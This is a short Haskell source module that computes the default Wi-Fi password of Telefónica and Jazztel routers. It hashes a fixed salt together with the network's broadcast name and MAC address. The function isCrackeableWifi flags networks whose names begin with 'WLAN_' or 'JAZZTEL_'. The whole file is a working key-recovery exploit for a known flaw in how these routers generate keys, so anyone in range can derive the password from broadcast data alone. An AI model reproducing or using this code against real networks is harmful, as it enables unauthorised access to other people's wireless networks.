-- |
-- Copyright   : (C) Ivan Perez trading as Keera Studios, 2012
-- License     : BSD3
-- Maintainer  : support@keera.co.uk

module Crypto.DefaultTelefonicaPassword
  ( getWifiPass, isCrackeableWifi )
  where

import Data.Hash.MD5
import Data.List
-- import Safe (tailSafe, initSafe)

isCrackeableWifi :: (String, String) -> Bool
isCrackeableWifi (essid, _) = any (`isPrefixOf` essid) wifiPrefixes

getWifiPass :: (String, String) -> String
getWifiPass (essid, address) = take 20 md5sum
  where bssid    = filter (/= ':') address
        bssidfst = take 8 bssid
        essidsfx = drop 1 $ dropWhile (/= '_') essid
        -- essidsfx = dropWhile (/= '_') essid
        code     = "bcgbghgg" ++ bssidfst ++ essidsfx ++ bssid
        md5sum   = md5s (Str code)

wifiPrefixes :: [ String ]
wifiPrefixes = [ "WLAN_", "JAZZTEL_" ]

-- getField :: String -> String -> Maybe String
-- getField _ [] = Nothing
-- getField field s@(_:xs)
--  | field `isPrefixOf` s = stripPrefix field s
--  | field `isInfixOf` s  = getField field xs
--  | otherwise            = Nothing
-- 
-- getAddress :: String -> Maybe String
-- getAddress = getField fieldAddress
--     
-- getESSID :: String -> Maybe String
-- getESSID = ( fmap ( tailSafe . initSafe ) ) . ( getField fieldESSID )
--
-- fieldAddress, fieldESSID :: String
-- fieldAddress = " - Address: "
-- fieldESSID   = "ESSID:"
